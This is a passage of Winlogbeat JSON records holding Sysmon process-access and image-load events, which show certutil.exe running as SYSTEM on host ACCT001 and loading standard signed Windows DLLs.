ImageLoad)","created":"2019-10-28T02:31:41.434Z","kind":"event"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.378Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nSourceProcessGUID: {a158f72c-3a9b-5db6-0000-001002ed8b00}\nSourceProcessId: 4792\nSourceThreadId: 1336\nSourceImage: C:\\Windows\\system32\\conhost.exe\nTargetProcessGUID: {a158f72c-530d-5db6-0000-001062e9af00}\nTargetProcessId: 3728\nTargetImage: C:\\Windows\\system32\\certutil.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\system32\\conhost.exe+1260d|C:\\Windows\\system32\\conhost.exe+12505|C:\\Windows\\system32\\conhost.exe+895c|C:\\Windows\\system32\\conhost.exe+f2e6|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"winlog":{"event_data":{"SourceThreadId":"1336","TargetProcessGUID":"{a158f72c-530d-5db6-0000-001062e9af00}","TargetImage":"C:\\Windows\\system32\\certutil.exe","SourceProcessGUID":"{a158f72c-3a9b-5db6-0000-001002ed8b00}","SourceProcessId":"4792","TargetProcessId":"3728","GrantedAccess":"0x1fffff","UtcTime":"2019-10-28 02:31:41.376","SourceImage":"C:\\Windows\\system32\\conhost.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\system32\\conhost.exe+1260d|C:\\Windows\\system32\\conhost.exe+12505|C:\\Windows\\system32\\conhost.exe+895c|C:\\Windows\\system32\\conhost.exe+f2e6|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71"},"process":{"pid":3208,"thread":{"id":5108}},"channel":"Microsoft-Windows-Sysmon/Operational","api":"wineventlog","opcode":"Info","record_id":271581,"computer_name":"ACCT001.shire.com","version":3,"provider_name":"Microsoft-Windows-Sysmon","event_id":10,"task":"Process accessed (rule: ProcessAccess)","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"}},"event":{"created":"2019-10-28T02:31:41.435Z","kind":"event","code":10,"action":"Process accessed (rule: ProcessAccess)"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:41.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"record_id":271582,"task":"Image loaded (rule: ImageLoad)","computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"Info","process":{"pid":3208,"thread":{"id":5108}},"version":3,"event_data":{"Signed":"true","Image":"C:\\Windows\\System32\\certutil.exe","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","OriginalFileName":"advapi32.dll","Signature":"Microsoft Windows","Product":"Microsoft Windows Operating System","Hashes":"SHA1=51A6EA37D4F84790C3E0294245F9ABDF5E07079C,MD5=DA132C88434FE7689E9503ACA5CD93B3,SHA256=E1D2CEF7DEF91E45317C03DC64764AF145AA74468881CCEF0666B39A87DF9EE3,IMPHASH=2EC97399E2184A00955C40B48ABB77B5","Company":"Microsoft Corporation","UtcTime":"2019-10-28 02:31:41.376","Description":"Advanced Windows 32 Base API","ImageLoaded":"C:\\Windows\\System32\\advapi32.dll","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","SignatureStatus":"Valid","ProcessId":"3728"},"event_id":7,"provider_name":"Microsoft-Windows-Sysmon","api":"wineventlog"},"event":{"created":"2019-10-28T02:31:41.435Z","kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\advapi32.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Advanced Windows 32 Base API\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: advapi32.dll\nHashes: SHA1=51A6EA37D4F84790C3E0294245F9ABDF5E07079C,MD5=DA132C88434FE7689E9503ACA5CD93B3,SHA256=E1D2CEF7DEF91E45317C03DC64764AF145AA74468881CCEF0666B39A87DF9EE3,IMPHASH=2EC97399E2184A00955C40B48ABB77B5\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:41.436Z"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\msvcrt.dll\nFileVersion: 7.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows NT CRT DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: msvcrt.dll\nHashes: SHA1=0EA4B3CFB14E49CEC0D42FF0F1FA989E69647A8F,MD5=36354D9B5B0A58A4B9A19103852C00A2,SHA256=E5A863D3F4BFEFED7D73A7B1499F81B7235BC9AE3C108065041BCB8E5446B1BB,IMPHASH=1273683626EBBA703979F188A1E64237\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","winlog":{"api":"wineventlog","event_id":7,"provider_name":"Microsoft-Windows-Sysmon","computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","task":"Image loaded (rule: ImageLoad)","record_id":271583,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"ProcessId":"3728","SignatureStatus":"Valid","Image":"C:\\Windows\\System32\\certutil.exe","OriginalFileName":"msvcrt.dll","Hashes":"SHA1=0EA4B3CFB14E49CEC0D42FF0F1FA989E69647A8F,MD5=36354D9B5B0A58A4B9A19103852C00A2,SHA256=E5A863D3F4BFEFED7D73A7B1499F81B7235BC9AE3C108065041BCB8E5446B1BB,IMPHASH=1273683626EBBA703979F188A1E64237","Product":"Microsoft Windows Operating System","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","Signed":"true","UtcTime":"2019-10-28 02:31:41.376","ImageLoaded":"C:\\Windows\\System32\\msvcrt.dll","Signature":"Microsoft Windows","Company":"Microsoft Corporation","Description":"Windows NT CRT DLL","FileVersion":"7.0.18362.1 (WinBuild.160101.0800)"},"channel":"Microsoft-Windows-Sysmon/Operational","version":3,"process":{"pid":3208,"thread":{"id":5108}},"opcode":"Info"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"opcode":"Info","event_data":{"Signature":"Microsoft Windows","Company":"Microsoft Corporation","Product":"Microsoft Windows Operating System","SignatureStatus":"Valid","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","ImageLoaded":"C:\\Windows\\System32\\sechost.dll","OriginalFileName":"sechost.dll","Image":"C:\\Windows\\System32\\certutil.exe","Signed":"true","ProcessId":"3728","Description":"Host for SCM/SDDL/LSA Lookup APIs","UtcTime":"2019-10-28 02:31:41.376","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Hashes":"SHA1=00DAFA555E44301C9C42F165DD223D8CE5EA23BD,MD5=9C897DB5845E9D0CC704CB0CC8674369,SHA256=5E826F83B929A9993DC31F448E1D15E7394A332585A6150170592E908316B19A,IMPHASH=CE4BD072766253F6A267D0284CA82002"},"api":"wineventlog","task":"Image loaded (rule: ImageLoad)","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","computer_name":"ACCT001.shire.com","event_id":7,"record_id":271584,"version":3,"process":{"pid":3208,"thread":{"id":5108}}},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.476Z"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\sechost.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Host for SCM/SDDL/LSA Lookup APIs\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: sechost.dll\nHashes: SHA1=00DAFA555E44301C9C42F165DD223D8CE5EA23BD,MD5=9C897DB5845E9D0CC704CB0CC8674369,SHA256=5E826F83B929A9993DC31F448E1D15E7394A332585A6150170592E908316B19A,IMPHASH=CE4BD072766253F6A267D0284CA82002\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4"}}
{"@timestamp":"2019-10-28T02:31:41.380Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\rpcrt4.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Remote Procedure Call Runtime\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: rpcrt4.dll\nHashes: SHA1=66B3BD2329E351529C9DF1907C080328FD758CDC,MD5=F1ECA4F2ED08CE2D0C41E1200E2961F9,SHA256=78C4D3F9607A399DCD96E9067A14F143E9838FB02E78E7775675BC7D46D8D703,IMPHASH=88E7E7C7FA90052EC162DD37F2B7C7BD\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"winlog":{"user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"event_data":{"Hashes":"SHA1=66B3BD2329E351529C9DF1907C080328FD758CDC,MD5=F1ECA4F2ED08CE2D0C41E1200E2961F9,SHA256=78C4D3F9607A399DCD96E9067A14F143E9838FB02E78E7775675BC7D46D8D703,IMPHASH=88E7E7C7FA90052EC162DD37F2B7C7BD","Description":"Remote Procedure Call Runtime","Company":"Microsoft Corporation","Signed":"true","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UtcTime":"2019-10-28 02:31:41.376","ProcessId":"3728","OriginalFileName":"rpcrt4.dll","ImageLoaded":"C:\\Windows\\System32\\rpcrt4.dll","SignatureStatus":"Valid","Signature":"Microsoft Windows","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\System32\\certutil.exe"},"record_id":271585,"task":"Image loaded (rule: ImageLoad)","opcode":"Info","event_id":7,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","channel":"Microsoft-Windows-Sysmon/Operational","process":{"pid":3208,"thread":{"id":5108}},"version":3,"provider_name":"Microsoft-Windows-Sysmon","api":"wineventlog","computer_name":"ACCT001.shire.com"},"event":{"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.476Z","kind":"event","code":7}}
{"@timestamp":"2019-10-28T02:31:41.381Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"created":"2019-10-28T02:31:42.476Z","kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\crypt32.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Crypto API32\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CRYPT32.DLL\nHashes: SHA1=35EAADE222905773197428BA4701975EC4CC0F47,MD5=CC7B3372C3CEC0E758D30336AB93FE96,SHA256=0027FF90DCA79C2CC1359DF54B8CECDE3D88FF87A3222D463A52D600086095E3,IMPHASH=B379A20CAA4CFFA680F9DFCB1E5F9E24\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_data":{"OriginalFileName":"CRYPT32.DLL","Image":"C:\\Windows\\System32\\certutil.exe","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","Hashes":"SHA1=35EAADE222905773197428BA4701975EC4CC0F47,MD5=CC7B3372C3CEC0E758D30336AB93FE96,SHA256=0027FF90DCA79C2CC1359DF54B8CECDE3D88FF87A3222D463A52D600086095E3,IMPHASH=B379A20CAA4CFFA680F9DFCB1E5F9E24","Signed":"true","Description":"Crypto API32","Product":"Microsoft Windows Operating System","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","SignatureStatus":"Valid","Signature":"Microsoft Windows","Company":"Microsoft Corporation","UtcTime":"2019-10-28 02:31:41.376","ImageLoaded":"C:\\Windows\\System32\\crypt32.dll","ProcessId":"3728"},"event_id":7,"record_id":271586,"version":3,"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","task":"Image loaded (rule: ImageLoad)","api":"wineventlog","computer_name":"ACCT001.shire.com","opcode":"Info","user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"process":{"thread":{"id":5108},"pid":3208}}}
{"@timestamp":"2019-10-28T02:31:41.382Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"process":{"thread":{"id":5108},"pid":3208},"event_data":{"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ImageLoaded":"C:\\Windows\\System32\\certcli.dll","UtcTime":"2019-10-28 02:31:41.376","Company":"Microsoft Corporation","Image":"C:\\Windows\\System32\\certutil.exe","SignatureStatus":"Valid","OriginalFileName":"CertCli","Signed":"true","Signature":"Microsoft Windows","Hashes":"SHA1=D95478264B6A69E08BECDC7C8AD8B00972366873,MD5=765DCE11A71741261E8C2F86A759C174,SHA256=2232C19432C2610BD9DA44873147B2946F4A831B29E2DF6A3942A7318822540A,IMPHASH=36E992551F2EC9717AFE4148AB693C9E","Description":"Microsoft Active Directory Certificate Services Client","ProcessId":"3728","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","Product":"Microsoft Windows Operating System"},"computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","record_id":271587,"api":"wineventlog","opcode":"Info","version":3,"provider_name":"Microsoft-Windows-Sysmon","task":"Image loaded (rule: ImageLoad)","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"channel":"Microsoft-Windows-Sysmon/Operational","event_id":7},"event":{"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.476Z","kind":"event","code":7},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\certcli.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Microsoft Active Directory Certificate Services Client\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertCli\nHashes: SHA1=D95478264B6A69E08BECDC7C8AD8B00972366873,MD5=765DCE11A71741261E8C2F86A759C174,SHA256=2232C19432C2610BD9DA44873147B2946F4A831B29E2DF6A3942A7318822540A,IMPHASH=36E992551F2EC9717AFE4148AB693C9E\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat"}}
{"@timestamp":"2019-10-28T02:31:41.382Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":3,"user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"event_data":{"Description":"Microsoft C Runtime Library","ProcessId":"3728","Product":"Microsoft Windows Operating System","Hashes":"SHA1=375BEFF676D1823A67E7C9CD4C1F5FEE23AEA291,MD5=E3E6F8CF136910305DA93F81101177A1,SHA256=AEE341007B9149282E99B95336BC627474E85D36176FC240AE66EC12FEECC169,IMPHASH=5AE9A136FAFA10321F3D48251BF4F6A1","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","SignatureStatus":"Valid","UtcTime":"2019-10-28 02:31:41.376","Image":"C:\\Windows\\System32\\certutil.exe","ImageLoaded":"C:\\Windows\\System32\\ucrtbase.dll","Signature":"Microsoft Windows","Company":"Microsoft Corporation","OriginalFileName":"ucrtbase.dll","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Signed":"true"},"provider_name":"Microsoft-Windows-Sysmon","record_id":271588,"task":"Image loaded (rule: ImageLoad)","opcode":"Info","channel":"Microsoft-Windows-Sysmon/Operational","api":"wineventlog","computer_name":"ACCT001.shire.com","process":{"pid":3208,"thread":{"id":5108}},"event_id":7},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.476Z"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\ucrtbase.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Microsoft C Runtime Library\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: ucrtbase.dll\nHashes: SHA1=375BEFF676D1823A67E7C9CD4C1F5FEE23AEA291,MD5=E3E6F8CF136910305DA93F81101177A1,SHA256=AEE341007B9149282E99B95336BC627474E85D36176FC240AE66EC12FEECC169,IMPHASH=5AE9A136FAFA10321F3D48251BF4F6A1\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:41.382Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.476Z"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\Wldap32.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Win32 LDAP API DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: WLDAP32.DLL\nHashes: SHA1=03DCA46FE7D5F87F035269EDAB3081B84310D6B2,MD5=5FE7D4743D216091DA8760D9336E500B,SHA256=5A59802A226DA91D349B6C207491EBA4FC3FB457850A193090BD704A6FC9A00C,IMPHASH=F7AEA6F23FD3BA4DA0381D63C6FC222E\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","winlog":{"event_id":7,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","process":{"pid":3208,"thread":{"id":5108}},"record_id":271589,"task":"Image loaded (rule: ImageLoad)","event_data":{"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Signature":"Microsoft Windows","Description":"Win32 LDAP API DLL","Image":"C:\\Windows\\System32\\certutil.exe","Signed":"true","ProcessId":"3728","UtcTime":"2019-10-28 02:31:41.376","ImageLoaded":"C:\\Windows\\System32\\Wldap32.dll","Company":"Microsoft Corporation","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","OriginalFileName":"WLDAP32.DLL","Hashes":"SHA1=03DCA46FE7D5F87F035269EDAB3081B84310D6B2,MD5=5FE7D4743D216091DA8760D9336E500B,SHA256=5A59802A226DA91D349B6C207491EBA4FC3FB457850A193090BD704A6FC9A00C,IMPHASH=F7AEA6F23FD3BA4DA0381D63C6FC222E","SignatureStatus":"Valid","Product":"Microsoft Windows Operating System"},"channel":"Microsoft-Windows-Sysmon/Operational","version":3,"api":"wineventlog","computer_name":"ACCT001.shire.com","opcode":"Info","provider_name":"Microsoft-Windows-Sysmon","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"}}}
